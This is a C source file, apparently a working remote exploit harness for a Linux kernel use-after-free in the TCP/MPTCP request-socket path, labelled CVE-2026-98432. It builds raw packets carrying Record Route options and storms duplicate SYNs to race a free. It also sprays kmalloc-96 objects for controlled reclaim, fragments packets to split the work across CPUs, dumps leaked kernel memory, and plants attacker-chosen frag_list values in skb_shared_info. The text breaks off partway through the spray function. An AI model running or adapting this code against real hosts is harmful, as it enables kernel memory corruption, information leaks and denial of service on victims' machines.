/*
 * mpstorm3.c - CVE-2026-98432 self-cycling dispose storm.
 *
 * Layout (4 vCPU guest):
 *   CPU 0      capture thread: sees every SYN-ACK for the victim tuple,
 *              checks the RR tail for slab poison (UAF!), and immediately
 *              sends the plain final ACK (seq = client_isn+1,
 *              ack = server_isn+1, no MP_JOIN option) => child created,
 *              ireq_opt transferred, dispose_child, kfree(inet_opt) --
 *              all inside the ACK softirq on CPU 0.
 *   CPU 1..N   storm threads: send the same MP_JOIN SYN every spacing_us.
 *              After each dispose the next SYN re-creates the req; the
 *              first dup SYN on the fresh req fires the rate-limited
 *              SYN-ACK retransmit (the READER: tcp_check_req ->
 *              inet_rtx_syn_ack -> tcp_v4_send_synack reads ireq_opt).
 *
 * Each req cycle (~30us) is an independent sample of the offset between
 * the reader's load->copy span (~100-300ns) and the ACK's kfree. A hit
 * shows as a fully 0x6b-poisoned RR tail in a SYN-ACK (slub_debug=P).
 *
 * Build: gcc -O2 -static -pthread -o mpstorm3 mpstorm3.c
 * Usage: sudo ./mpstorm3 <port> <token_hex> <sport> <runtime_s>
 *                 <spacing_us> [nstorm]
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <net/if.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>

#define IPHDR 60
#define OPT_RR 7
#define MPTCP_KIND 30
#define RR_TAIL_OFF 27          /* marker slots at opts+27..38 */

static uint16_t g_dport;
static uint16_t g_sport;
static int g_varyport;
static uint32_t g_client_isn;
static char g_src_ip_str[40] = "127.0.0.1";  /* SYN source (the X write value) */
static char g_dst_ip_str[40] = "127.0.0.1";  /* SYN dest = listener (the Y write value) */
static volatile int g_run = 1, g_cap_ready;
static volatile uint64_t g_syn_sent, g_synacks, g_acks_sent;
static volatile uint64_t g_poison, g_foreign, g_reuse;
static uint64_t g_hist[64];       /* SYN-ACK -> dispose-RST latency, 1us buckets */
static volatile uint64_t g_spray_sent;
static unsigned char g_syn[IPHDR + 20 + 12];
static unsigned char g_ack[IPHDR + 20];   /* template; ack# patched */
static unsigned char g_ack_nip[40];       /* final ACK with NO IP options:
                                             keeps the 4-tuple hash (ports),
                                             so it lands on the SYN's CPU
                                             instead of the fragment CPU */

/* controlled-reclaim spray (second tuple, CPU 0 = freeing CPU) */
static uint16_t g_spray_sport;           /* 0 = disabled */
static uint32_t g_spray_marker;          /* 0x5BB5xxxx | spray sport */
static uint32_t g_spray_isn;
static long g_spray_spacing_us = 100;
static unsigned char g_spray_syn[IPHDR + 20 + 12];
static unsigned char g_spray_ack[IPHDR + 20];

/* saved_syn reclaim spray: a SYN with NO IP options and 40 bytes of TCP
 * options.  tcp_reqsk_record_syn() then allocates a 92-byte saved_syn
 * (kmalloc-96) and there is NO competing tcp_v4_save_options allocation.
 * The spoofed source 192.0.2.69 makes the ip_options view read
 * optlen=192, srr=0 (no srr/rr/ts write; a pure 192-byte over-read). */
static char g_spray_src[40] = "192.0.2.69";
static uint16_t g_spray_dport = 9801;
static unsigned char g_saved_spray[128];
static int g_saved_len = 80;
/* SPRAY_PORTS: prebuilt saved_syn packets with rotating source ports, all
 * mapped (by RPS) to the victim slab-owner CPU.  Sending a fresh tuple each
 * time raises the target's saved_syn alloc ratio well above the ~8% of a
 * single fixed 4-tuple. */
static unsigned char g_rot_pkt[64][128];
static int g_rot_len[64];
static int g_rot_n;
static int g_rot_used;

static void pin(int cpu) {
    cpu_set_t s;
    CPU_ZERO(&s); CPU_SET(cpu, &s);
    pthread_setaffinity_np(pthread_self(), sizeof(s), &s);
}

static double now_us(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1e6 + ts.tv_nsec / 1e3;
}

static uint16_t csum(const unsigned char *b, int len) {
    uint32_t s = 0;
    for (int i = 0; i < len; i += 2)
        s += (b[i] << 8) | (i + 1 < len ? b[i + 1] : 0);
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return ~s & 0xffff;
}

static void build(unsigned char *pkt, uint16_t sport, uint16_t dport,
                  uint32_t seq, uint32_t ackn, uint8_t flags,
                  const unsigned char *tcpopt, int tcpoptlen,
                  uint32_t marker, int tail_off) {
    uint32_t sip, dip;
    inet_pton(AF_INET, g_src_ip_str, &sip);
    inet_pton(AF_INET, g_dst_ip_str, &dip);
    memset(pkt, 0, IPHDR + 20 + tcpoptlen);
    unsigned char *ip = pkt, *tcp = pkt + IPHDR;
    int total = IPHDR + 20 + tcpoptlen;
    ip[0] = 0x4f;
    ip[2] = total >> 8; ip[3] = total & 0xff;
    ip[4] = seq >> 16; ip[5] = seq;
    ip[6] = 0x40;
    ip[8] = 64; ip[9] = 6;
    memcpy(ip + 12, &sip, 4);
    memcpy(ip + 16, &dip, 4);
    /* A leading NOP makes the RR option's offset nonzero.  __ip_options_echo
     * tests `if (sopt->rr)` where rr is the option offset, so an RR at
     * offset 0 is NOT saved and tcp_v4_route_req never allocates the
     * ip_options_rcu victim. */
    ip[20] = 0x01;
    ip[21] = OPT_RR; ip[22] = 39; ip[23] = 4;
    if (getenv("RR_NO_NOP")) {
        /* reproduce the old geometry: RR at option offset 0, which
         * __ip_options_echo treats as absent (no save_options). */
        ip[20] = OPT_RR; ip[21] = 39; ip[22] = 4;
    }
    for (int off = tail_off; off <= tail_off + 8; off += 4)
        memcpy(ip + off, &marker, 4);
    ip[59] = 0;
    tcp[0] = sport >> 8; tcp[1] = sport & 0xff;
    tcp[2] = dport >> 8; tcp[3] = dport & 0xff;
    tcp[4] = seq >> 24; tcp[5] = seq >> 16; tcp[6] = seq >> 8; tcp[7] = seq;
    tcp[8] = ackn >> 24; tcp[9] = ackn >> 16;
    tcp[10] = ackn >> 8; tcp[11] = ackn;
    tcp[12] = (5 + tcpoptlen / 4) << 4;
    tcp[13] = flags;
    tcp[14] = 0xff; tcp[15] = 0xff;
    if (tcpopt && tcpoptlen)
        memcpy(pkt + IPHDR + 20, tcpopt, tcpoptlen);
    ip[10] = ip[11] = 0;
    uint16_t c = csum(ip, IPHDR);
    ip[10] = c >> 8; ip[11] = c & 0xff;
    int tlen = 20 + tcpoptlen;
    unsigned char ph[12], buf[12 + 40];
    memcpy(ph, ip + 12, 8);
    ph[8] = 0; ph[9] = 6; ph[10] = tlen >> 8; ph[11] = tlen & 0xff;
    tcp[16] = tcp[17] = 0;
    memcpy(buf, ph, 12);
    memcpy(buf + 12, tcp, tlen);
    c = csum(buf, 12 + tlen);
    tcp[16] = c >> 8; tcp[17] = c & 0xff;
}

/* no-IP-option SYN with 40 bytes of TCP options -> saved_syn kmalloc-96 */
static void build_saved_spray(unsigned char *pkt, uint16_t sport, uint16_t dport,
                              uint32_t seq) {
    uint32_t sip, dip;
    /* SPRAY_IPOPT4: a 24-byte IP header (4 bytes of EOL/padding) makes the
     * saved_syn allocation exactly 96 bytes (12 + 24 + 60), so it fills the
     * kmalloc-96 slot and the shinfo-bound bytes come from the neighbour
     * slot's TCP options (fully controlled).  The 4-byte option area is
     * EOL+pad, so tcp_v4_save_options() sees optlen 0 and does not allocate
     * a competing ip_options object. */
    int ipopt = getenv("SPRAY_IPOPT4") != NULL;
    int ihl = ipopt ? 24 : 20;
    inet_pton(AF_INET, g_spray_src, &sip);
    inet_pton(AF_INET, g_dst_ip_str, &dip);
    memset(pkt, 0, 128);
    unsigned char *ip = pkt, *tcp = pkt + ihl;
    ip[0] = ipopt ? 0x46 : 0x45; ip[2] = 0; ip[3] = ihl + 60;
    ip[4] = seq >> 24; ip[5] = seq >> 16; ip[6] = 0x40;
    ip[8] = 64; ip[9] = 6;
    memcpy(ip + 12, &sip, 4);
    memcpy(ip + 16, &dip, 4);
    tcp[0] = sport >> 8; tcp[1] = sport & 0xff;
    tcp[2] = dport >> 8; tcp[3] = dport & 0xff;
    tcp[4] = seq >> 24; tcp[5] = seq >> 16; tcp[6] = seq >> 8; tcp[7] = seq;
    tcp[12] = 15 << 4; tcp[13] = 0x02; tcp[14] = 0xff; tcp[15] = 0xff;
    unsigned char *o = tcp + 20;
    o[0] = 2; o[1] = 4; o[2] = 0x05; o[3] = 0xb4;   /* MSS 1460 */
    o[4] = 4; o[5] = 2;                              /* SACK permitted */
    o[6] = 1; o[7] = 1; o[8] = 8; o[9] = 10;         /* NOP NOP TS */
    memcpy(o + 10, &g_spray_marker, 4);   /* TSval = distinctive marker */
    for (int i = 14; i < 40; i++) o[i] = 1;
    if (ipopt) {
        for (int i = 24; i < 40; i++) o[i] = 0;   /* shinfo fields -> benign */
        /* PAYLOAD_FRAG: the 96-byte IPOPT4 saved_syn fills its slot, so the
         * bytes the OOB copy puts into skb_shared_info come from this TCP
         * option area: neighbour+82/83 -> o[26]/o[27] (nr_frags/tx_flags),
         * neighbour+88..95 -> o[32..39] (frag_list). */
        const char *pf = getenv("PAYLOAD_FRAG");
        if (pf) {
            unsigned long long f = strtoull(pf, NULL, 0);
            o[26] = 0; o[27] = 0;
            memcpy(o + 32, &f, 8);
        }
    }
    ip[10] = ip[11] = 0;
    uint16_t c = csum(ip, ihl); ip[10] = c >> 8; ip[11] = c & 0xff;
    unsigned char ph[12], buf[12 + 60];
    memcpy(ph, ip + 12, 8); ph[8] = 0; ph[9] = 6; ph[10] = 0; ph[11] = 60;
    tcp[16] = tcp[17] = 0;
    memcpy(buf, ph, 12); memcpy(buf + 12, tcp, 60);
    c = csum(buf, 72); tcp[16] = c >> 8; tcp[17] = c & 0xff;
    g_saved_len = ihl + 60;
}

/* patch the spray SYN's source port + TCP checksum (unique-tuple spray) */
static void patch_spray_sport(uint16_t sp) {
    int ihl = g_saved_len - 60;
    unsigned char *ip = g_saved_spray, *tcp = g_saved_spray + ihl;
    tcp[0] = sp >> 8; tcp[1] = sp & 0xff;
    unsigned char ph[12], buf[72];
    memcpy(ph, ip + 12, 8); ph[8] = 0; ph[9] = 6; ph[10] = 0; ph[11] = 60;
    tcp[16] = tcp[17] = 0;
    memcpy(buf, ph, 12); memcpy(buf + 12, tcp, 60);
    uint16_t c = csum(buf, 72);
    tcp[16] = c >> 8; tcp[17] = c & 0xff;
}

/* patch the ack number in the ACK template + fix the TCP checksum */
static void patch_ack(unsigned char *pkt, uint32_t ackn) {
    unsigned char *ip = pkt, *tcp = pkt + IPHDR;
    tcp[8] = ackn >> 24; tcp[9] = ackn >> 16;
    tcp[10] = ackn >> 8; tcp[11] = ackn;
    unsigned char ph[12], buf[12 + 20];
    memcpy(ph, ip + 12, 8);
    ph[8] = 0; ph[9] = 6; ph[10] = 0; ph[11] = 20;
    tcp[16] = tcp[17] = 0;
    memcpy(buf, ph, 12);
    memcpy(buf + 12, tcp, 20);
    uint16_t c = csum(buf, 32);
    tcp[16] = c >> 8; tcp[17] = c & 0xff;
}

/* Remote cross-CPU lever: send a TCP packet as two IPv4 fragments.  The
 * non-first fragment has no L4 ports, so the target's RPS hash differs from
 * the unfragmented 4-tuple; the target reassembles in the context of the CPU
 * that processes the last fragment.  The capture-driven plain ACK stays
 * unfragmented, so the dup-SYN reader (fragment CPU) and the dispose free
 * (per-flow CPU) can run on different CPUs on a single-queue NIC. */
static void send_frag(int s, const unsigned char *pkt, int len,
                      const struct sockaddr_in *dst) {
    const unsigned char *ip = pkt;
    int ihl = (ip[0] & 0x0f) * 4;
    int payload = len - ihl;
    if (ihl < 20 || payload <= 16) {
        sendto(s, pkt, len, 0, (const struct sockaddr *)dst, sizeof(*dst));
        return;
    }
    unsigned char f1[256], f2[256];
    uint16_t id = (uint16_t)(0x4000 + (getpid() & 0x3fff));
    int f1t = ihl + 16;
    memcpy(f1, ip, f1t);
    f1[2] = f1t >> 8; f1[3] = f1t;
    f1[4] = id >> 8; f1[5] = id;
    f1[6] = 0x20; f1[7] = 0;            /* MF=1, offset 0 */
    f1[10] = f1[11] = 0;
    uint16_t c = csum(f1, ihl); f1[10] = c >> 8; f1[11] = c & 0xff;
    int rest = payload - 16;
    int f2t = 20 + rest;
    memset(f2, 0, 20);
    f2[0] = 0x45; f2[1] = ip[1];
    f2[2] = f2t >> 8; f2[3] = f2t;
    f2[4] = id >> 8; f2[5] = id;
    f2[6] = 0; f2[7] = 2;               /* offset 16 bytes, MF=0 */
    f2[8] = ip[8]; f2[9] = ip[9];
    memcpy(f2 + 12, ip + 12, 8);
    c = csum(f2, 20); f2[10] = c >> 8; f2[11] = c & 0xff;
    memcpy(f2 + 20, ip + ihl + 16, rest);
    sendto(s, f1, f1t, 0, (const struct sockaddr *)dst, sizeof(*dst));
    sendto(s, f2, f2t, 0, (const struct sockaddr *)dst, sizeof(*dst));
}

/* 20-byte IP header + 20-byte TCP header (no IP options) */
static void build_noip(unsigned char *pkt, uint16_t sport, uint16_t dport,
                       uint32_t seq, uint32_t ackn, uint8_t flags) {
    uint32_t sip, dip;
    inet_pton(AF_INET, g_src_ip_str, &sip);
    inet_pton(AF_INET, g_dst_ip_str, &dip);
    memset(pkt, 0, 40);
    unsigned char *ip = pkt, *tcp = pkt + 20;
    ip[0] = 0x45; ip[2] = 0; ip[3] = 40;
    ip[4] = seq >> 24; ip[5] = seq >> 16; ip[6] = 0x40;
    ip[8] = 64; ip[9] = 6;
    memcpy(ip + 12, &sip, 4);
    memcpy(ip + 16, &dip, 4);
    tcp[0] = sport >> 8; tcp[1] = sport & 0xff;
    tcp[2] = dport >> 8; tcp[3] = dport & 0xff;
    tcp[4] = seq >> 24; tcp[5] = seq >> 16; tcp[6] = seq >> 8; tcp[7] = seq;
    tcp[8] = ackn >> 24; tcp[9] = ackn >> 16; tcp[10] = ackn >> 8; tcp[11] = ackn;
    tcp[12] = 5 << 4; tcp[13] = flags; tcp[14] = 0xff; tcp[15] = 0xff;
    ip[10] = ip[11] = 0;
    uint16_t c = csum(ip, 20); ip[10] = c >> 8; ip[11] = c & 0xff;
    unsigned char ph[12], buf[32];
    memcpy(ph, ip + 12, 8); ph[8] = 0; ph[9] = 6; ph[10] = 0; ph[11] = 20;
    memcpy(buf, ph, 12); memcpy(buf + 12, tcp, 20);
    c = csum(buf, 32); tcp[16] = c >> 8; tcp[17] = c & 0xff;
}

static void patch_ack_nip(unsigned char *pkt, uint32_t ackn) {
    unsigned char *ip = pkt, *tcp = pkt + 20;
    tcp[8] = ackn >> 24; tcp[9] = ackn >> 16;
    tcp[10] = ackn >> 8; tcp[11] = ackn;
    unsigned char ph[12], buf[32];
    memcpy(ph, ip + 12, 8); ph[8] = 0; ph[9] = 6; ph[10] = 0; ph[11] = 20;
    tcp[16] = tcp[17] = 0;
    memcpy(buf, ph, 12); memcpy(buf + 12, tcp, 20);
    uint16_t c = csum(buf, 32); tcp[16] = c >> 8; tcp[17] = c & 0xff;
}

/* STORM_VARYPORT: rewrite the sport in g_syn + fix the checksums, so every
 * SYN creates a fresh req against a plain TCP listener (with a fixed sport
 * the first completed handshake parks an established child in the ehash and
 * all later SYNs for that 4-tuple hit the child instead of creating reqs). */
static volatile uint16_t g_sport_next;
static volatile uint32_t g_tsval_next;
static void vary_sport(unsigned char *pkt) {
    unsigned char *ip = pkt, *tcp = pkt + IPHDR;
    uint16_t sp = 1024 + (g_sport_next++ % 60000);
    tcp[0] = sp >> 8; tcp[1] = sp & 0xff;
    /* also bump the TS option value: identical tsval duplicates are PAWS
     * rejected in tcp_check_req (tsval <= ts_recent -> paws_reject -> the
     * retransmit fast path is skipped; measured 16 retx/s with a fixed
     * tsval). tsval must INCREASE so duplicates pass as retransmits. */
    uint32_t tv = ++g_tsval_next;
    /* TCP option area: NOP NOP kind(8) len(10) tsval[4..7] tsecr[8..11] */
    tcp[24] = tv >> 24; tcp[25] = tv >> 16; tcp[26] = tv >> 8; tcp[27] = tv;
    /* TCP checksum over pseudo-header + the 20+12 byte TCP header */
    unsigned char ph[12], buf[12 + 32];
    memcpy(ph, ip + 12, 8);
    ph[8] = 0; ph[9] = 6; ph[10] = 0; ph[11] = 32;
    tcp[16] = tcp[17] = 0;
    memcpy(buf, ph, 12);
    memcpy(buf + 12, tcp, 32);
    uint16_t c = csum(buf, 44);
    tcp[16] = c >> 8; tcp[17] = c & 0xff;
    /* IP checksum */
    ip[10] = ip[11] = 0;
    c = csum(ip, IPHDR);
    ip[10] = c >> 8; ip[11] = c & 0xff;
}

static void *capture_fn(void *arg) {
    (void)arg;
    pin(0);
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    int rcvbuf = 4 << 20;
    setsockopt(s, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
    if (s < 0) { perror("cap socket"); _exit(3); }
    struct timeval tv = { 1, 0 };
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    inet_pton(AF_INET, g_dst_ip_str, &dst.sin_addr);
    g_cap_ready = 1;
    unsigned char buf[8192];
    double last_synack_us = 0;
    while (g_run) {
        ssize_t n = recv(s, buf, sizeof(buf), 0);
        if (n < 0) continue;
        if (n < 40 || (buf[0] >> 4) != 4) continue;
        /* LEAK_DUMP: the over-read SYN-ACK has its TCP header overwritten by
         * the copied options, so the port filter below would drop it.  Dump
         * any oversized packet from the target for offline pointer parsing. */
        {
            static int leak_dumps;
            int cihl = (buf[0] & 0xF);
            if (getenv("LEAK_RAW") && cihl > 5 && n >= 60 &&
                leak_dumps < 5000 &&
                (g_spray_sport == 0 ||
                 (buf[20] == ((g_spray_sport >> 8) & 0xff) &&
                  buf[21] == (g_spray_sport & 0xff)))) {
                uint32_t src; memcpy(&src, buf + 12, 4);
                uint32_t tgt; inet_pton(AF_INET, g_dst_ip_str, &tgt);
                if (src == tgt) {
                    int lim = n < 240 ? (int)n : 240;
                    fprintf(stderr, "[LEAK] ihl=%d n=%zd ", cihl, n);
                    for (int i = 0; i < lim; i++) fprintf(stderr, "%02x", buf[i]);
                    fprintf(stderr, "\n");
                    leak_dumps++;
                }
            }
        }
        int ihl = (buf[0] & 0xF) * 4;
        if (ihl < 20 || n < ihl + 20) continue;
        const unsigned char *tcp = buf + ihl;
        uint16_t dport = ((tcp[2] << 8) | tcp[3]);
        uint8_t fl = tcp[13];

        /* ---- spray tuple: drive the dispose cycle so every spray SYN
         * creates a fresh req (and a fresh save_options allocation on
         * CPU 0). Without this the spray tuple's req lives ~1s and the
         * spray never allocates -> no reclaim. */
        if (g_spray_sport && dport == g_spray_sport) {
            if (fl != 0x12) continue;
            uint32_t server_isn = ((uint32_t)tcp[4] << 24)
                                | ((uint32_t)tcp[5] << 16)
                                | ((uint32_t)tcp[6] << 8) | tcp[7];
            patch_ack(g_spray_ack, server_isn + 1);
            sendto(s, g_spray_ack, IPHDR + 20, 0,
                    (struct sockaddr *)&dst, sizeof(dst));
            continue;
        }

        /* ---- main tuple ---- */
        if (dport != g_sport) {
            /* STORM_VARYPORT: the storm cycles source ports; every SYN-ACK
             * to a port in the varied range belongs to the main tuple. */
            if (!g_varyport || dport < 1024 || dport == 9700)
                continue;
        }
        if (fl == 0x04) {
            /* dispose RST: measure the SYN-ACK -> RST latency (L) */
            if (last_synack_us) {
                double d = now_us() - last_synack_us;
                if (d >= 0 && d < 64.0) {
                    int b = (int)d;
                    __sync_fetch_and_add(&g_hist[b], 1);
                }
            }
            continue;
        }
        if (fl != 0x12) continue;              /* SYN-ACK only */
        __sync_fetch_and_add(&g_synacks, 1);
        last_synack_us = now_us();

        /* --- UAF detection 1: malformed / poison-corrupted SYN-ACK ---
         * A reader whose ip_options_build copy ran after the kfree reads
         * poison: the optlen byte becomes 0x6b, producing a wild IP
         * header. Any SYN-ACK that is malformed or contains a long run
         * of 0x6b is a UAF read. */
        {
            int bad = 0;
            if (ihl < 20 || ihl > 60 || n < ihl) bad = 1;
            int run = 0, maxrun = 0;
            int scan = n < 100 ? n : 100;
            for (int i = 20; i < scan; i++) {
                if (buf[i] == 0x6b) {
                    if (++run > maxrun) maxrun = run;
                } else run = 0;
            }
            if (maxrun >= 8) bad = 1;
            if (bad) {
                __sync_fetch_and_add(&g_poison, 1);
                if (g_poison <= 5) {
                    fprintf(stderr, "[!!!] UAF SYN-ACK #%llu n=%zd ihl=%d "
                            "max6brun=%d raw=",
                            (unsigned long long)g_poison, n, ihl, maxrun);
                    for (int i = 0; i < (n < 120 ? n : 120); i++)
                        fprintf(stderr, "%02x", buf[i]);
                    fprintf(stderr, "\n");
                }
                /* still send the ACK: keep the dispose cycle running */
            }
        }

        /* --- UAF detection 2: well-formed RR tail fully poisoned --- */
        if (ihl == 60 && buf[20] == OPT_RR && buf[21] >= 39) {
            const unsigned char *tail = buf + 20 + RR_TAIL_OFF;
            if (memcmp(tail, "\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b"
                      "\x6b\x6b\x6b\x6b", 12) == 0) {
                __sync_fetch_and_add(&g_poison, 1);
                fprintf(stderr, "[!!!] POISON tail #%llu raw=",
                        (unsigned long long)g_poison);
                for (int i = 0; i < (n < 100 ? n : 100); i++)
                    fprintf(stderr, "%02x", buf[i]);
                fprintf(stderr, "\n");
            }
        }

        /* --- UAF detection 3: spray marker reuse (controlled reclaim) ---
         * If a controlled-reclaim spray is running (g_spray_sport != 0),
         * the freed object may be reallocated with the spray flow's
         * crafted options. The dangling main-tuple reader then emits a
         * SYN-ACK carrying the SPRAY marker -> wire-visible reuse. */
        if (g_spray_sport && ihl >= 24) {
            const unsigned char *mb = (const unsigned char *)&g_spray_marker;
            int limit = (ihl < n ? ihl : n) - 4;
            for (int off = 23; off <= limit; off++) {
                if (buf[off] == mb[0] && buf[off + 1] == mb[1] &&
                    buf[off + 2] == mb[2] && buf[off + 3] == mb[3]) {
                    __sync_fetch_and_add(&g_reuse, 1);
                    if (g_reuse <= 5) {
                        fprintf(stderr, "[###] REUSE #%llu: spray marker "
                                "%08x in main-tuple SYN-ACK raw=",
                                (unsigned long long)g_reuse, g_spray_marker);
                        for (int i = 0; i < (n < 100 ? n : 100); i++)
                            fprintf(stderr, "%02x", buf[i]);
                        fprintf(stderr, "\n");
                    }
                    break;
                }
            }
        }

        /* --- react: send the final ACK (optionally delayed) ---
         * STORM_ACKDELAY (us): delays the child creation past a LATER
         * duplicate SYN's read window. The dup at +t loads the pointer at
         * +t+1 and field-reads at +t+41; the child creation is gated on this
         * ACK and the free lands ~34us after it. Without the delay the free
         * is always ~2us AFTER the last usable reader's field read (the
         * initial build end + teardown scale together with the stretch).
         * With a ~50us delay the free lands at ~+110us while the +72/+84us
         * duplicates read at +114/+126us - INSIDE the window. */
        static int ack_delay_us = -1;
        if (ack_delay_us < 0)
            ack_delay_us = getenv("STORM_ACKDELAY") ? atoi(getenv("STORM_ACKDELAY")) : 0;
        if (ack_delay_us > 0) {
            double t0d = now_us();
            while (now_us() - t0d < ack_delay_us) ;
        }
        uint32_t server_isn = ((uint32_t)tcp[4] << 24)
                            | ((uint32_t)tcp[5] << 16)
                            | ((uint32_t)tcp[6] << 8) | tcp[7];
        if (g_varyport) {
            /* the ACK must carry the same source port as the SYN-ACK's dport */
            g_ack_nip[20] = tcp[2]; g_ack_nip[21] = tcp[3];
        }
        patch_ack_nip(g_ack_nip, server_isn + 1);
        sendto(s, g_ack_nip, 40, 0,
               (struct sockaddr *)&dst, sizeof(dst));
        __sync_fetch_and_add(&g_acks_sent, 1);
        /* ACK_SPRAY: the ACK above triggers the dispose free on the free
         * CPU; send one saved_syn SYN immediately behind it so the very
         * next kmalloc on that CPU pops the just-freed slot (LIFO). */
        if (getenv("ACK_SPRAY") && g_spray_sport && g_saved_len > 0) {
            struct sockaddr_in sd = dst;
            sd.sin_port = htons(g_spray_dport);
            static __thread uint16_t vp;
            int burst = getenv("ACK_SPRAY_BURST") ? atoi(getenv("ACK_SPRAY_BURST")) : 1;
            for (int k = 0; k < burst; k++) {
                if (getenv("ACK_SPRAY_VARY")) {
                    /* unique 4-tuple per packet: otherwise the listener
                     * coalesces repeats as retransmissions. */
                    if (!vp) vp = g_spray_sport;
                    vp++;
                    if (!vp) vp = g_spray_sport;
                    patch_spray_sport(vp);
                }
                if (sendto(s, g_saved_spray, g_saved_len, 0,
                           (struct sockaddr *)&sd, sizeof(sd)) > 0)
                    __sync_fetch_and_add(&g_spray_sent, 1);
            }
        }
    }
    return NULL;
}

static void *storm_fn(void *arg) {
    long spacing_us = (long)arg >> 8;
    int cpu = (int)((long)arg & 0xff);
    pin(cpu);
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    int rcvbuf = 1024;
    setsockopt(s, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    inet_pton(AF_INET, g_dst_ip_str, &dst.sin_addr);
    /* STORM_YIELD=1: sched_yield in the spin loop so a reclaim spray co-located
     * with the storm (STORM_CPU) actually gets CPU - otherwise the storm's
     * busy-spin starves it and the free->reclaim race is never observable. */
    int yield = getenv("STORM_YIELD") != NULL;
    int varyport = getenv("STORM_VARYPORT") != NULL;
    /* STORM_BURST duplicates per port at spacing_us apart. The free (child
     * destroy in the acceptor) lands ~34us after the child creation ~ +76us
     * after SYN_1. A duplicate at +k*spacing loads the pointer at
     * +k*spacing+1 and field-reads at +k*spacing+41: the window covering
     * +76us needs k*spacing in (35, 75): k=4 at spacing 12 -> load +49,
     * read +89 -> the free lands INSIDE. */
    int burst = getenv("STORM_BURST") ? atoi(getenv("STORM_BURST")) : (varyport ? 3 : 1);
    int burst_i = 0;
    double last = 0;
    /* MIXED_FRAG: decouple the slab-owner CPU from the reader CPU.
     * The creator SYN is sent UNFRAGMENTED, so the request and its
     * save_options object are allocated on the flow CPU F (and the
     * capture's plain ACK frees the child on F).  The duplicate reader
     * SYNs are sent FRAGMENTED, so tcp_check_req() -> tcp_v4_send_synack()
     * -> ip_options_build() runs on the L3-hash CPU L.  A reclaim spray
     * pinned (by RPS) to F can then allocate the freed slot while the
     * reader is in flight on L.  With the old all-fragmented storm the
     * alloc, reader and spray all shared L, so the reader could never
     * observe the reclaim (softirqs on one CPU are serialized). */
    int mixed = getenv("MIXED_FRAG") != NULL;
    int mixk = getenv("MIX_K") ? atoi(getenv("MIX_K")) : 4;
    long mixperiod = getenv("MIX_PERIOD") ? atol(getenv("MIX_PERIOD")) : 1000;
    double next_cycle = 0;
    while (g_run) {
        if (mixed) {
            double mnow = now_us();
            if (mnow >= next_cycle) {
                if (sendto(s, g_syn, IPHDR + 20 + 12, 0,
                           (struct sockaddr *)&dst, sizeof(dst)) > 0)
                    __sync_fetch_and_add(&g_syn_sent, 1);
                long sp = spacing_us > 0 ? spacing_us : 12;
                for (int k = 0; k < mixk; k++) {
                    double t0 = now_us();
                    while (now_us() - t0 < (double)sp) ;
                    send_frag(s, g_syn, IPHDR + 20 + 12, &dst);
                    __sync_fetch_and_add(&g_syn_sent, 1);
                }
                next_cycle = now_us() + (double)mixperiod;
            } else {
                for (volatile int i = 0; i < 50; i++) ;
            }
            continue;
        }
        double now = now_us();
        if (now - last >= spacing_us) {
            /* hold each port for `burst` sends at spacing_us apart: the
             * +spacing/+2*spacing duplicates land INSIDE the embryonic window
             * (initial build takes ~40us stretched), so their retransmit
             * readers load the pointer early and field-read it ~40us later -
             * past the child creation + our accept/close free. */
            if (varyport && burst_i == 0) vary_sport(g_syn);
            static __thread int fd_n;
            if (getenv("FRAG_DUPS")) {
                /* Every 8th SYN is unfragmented: it creates the request and
                 * its save_options object on the free CPU (same slab as the
                 * spray).  The other 7 are fragmented and become the
                 * cross-CPU reader on the L3-hash CPU. */
                if ((fd_n++ % 8) == 0) {
                    if (sendto(s, g_syn, IPHDR + 20 + 12, 0,
                               (struct sockaddr *)&dst, sizeof(dst)) > 0)
                        __sync_fetch_and_add(&g_syn_sent, 1);
                } else {
                    send_frag(s, g_syn, IPHDR + 20 + 12, &dst);
                    __sync_fetch_and_add(&g_syn_sent, 1);
                }
            } else if (getenv("FRAG_SYN")) {
                send_frag(s, g_syn, IPHDR + 20 + 12, &dst);
                __sync_fetch_and_add(&g_syn_sent, 1);
            } else if (sendto(s, g_syn, IPHDR + 20 + 12, 0,
                       (struct sockaddr *)&dst, sizeof(dst)) > 0) {
                __sync_fetch_and_add(&g_syn_sent, 1);
            }
            if (varyport) burst_i = (burst_i + 1) % burst;
            last = now;
        } else if (yield) {
            sched_yield();
        } else {
            for (volatile int i = 0; i < 20; i++) ;
        }
    }
    return NULL;
}

/* controlled-reclaim spray: pinned to the FREEING CPU (capture thread's
 * CPU = 0). Its MP_JOIN SYNs are processed on CPU 0, so their
 * tcp_v4_save_options() kmalloc-96 allocations pull from CPU 0's freelist
 * - where the dispose just freed the main tuple's options object. Same
 * callsite => same kmalloc cache even with RANDOM_KMALLOC_CACHES. The
 * sprayed object carries a distinct marker so a dangling main-tuple
 * reader copying it becomes wire-visible reuse. */
static void *spray_fn(void *arg) {
    (void)arg;
    pin(0);                     /* CPU 0 = freeing CPU */
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    int rcvbuf = 1024;
    setsockopt(s, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
